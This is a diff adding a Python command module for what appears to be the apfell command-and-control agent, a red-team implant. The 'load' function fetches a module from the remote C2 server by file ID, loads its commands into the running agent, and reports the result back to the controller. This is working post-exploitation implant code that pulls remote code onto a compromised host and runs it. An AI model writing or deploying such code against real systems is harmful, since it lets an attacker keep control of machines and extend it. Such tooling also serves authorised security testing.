@@ -1,0 +1,17 @@
+def load(apfell, c2, params="", task_id=-1):
+    try:
+        import json
+    except Exception as e:
+        c2.post_response(response="Failed to load modules", task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    try:
+        param_json = json.loads(params)
+        module = c2.upload(param_json['file_id'])
+        apfell.load_zip(module, param_json['cmds'])
+        c2.post_response(response="Loaded {}".format(param_json['cmds']), task_id=task_id)
+    except Exception as e:
+        c2.post_response(response="Failed to load module: {}".format(str(e)), task_id=task_id)
+    apfell.remove_job(task_id)
+
+COMMAND_ENDS_HERE
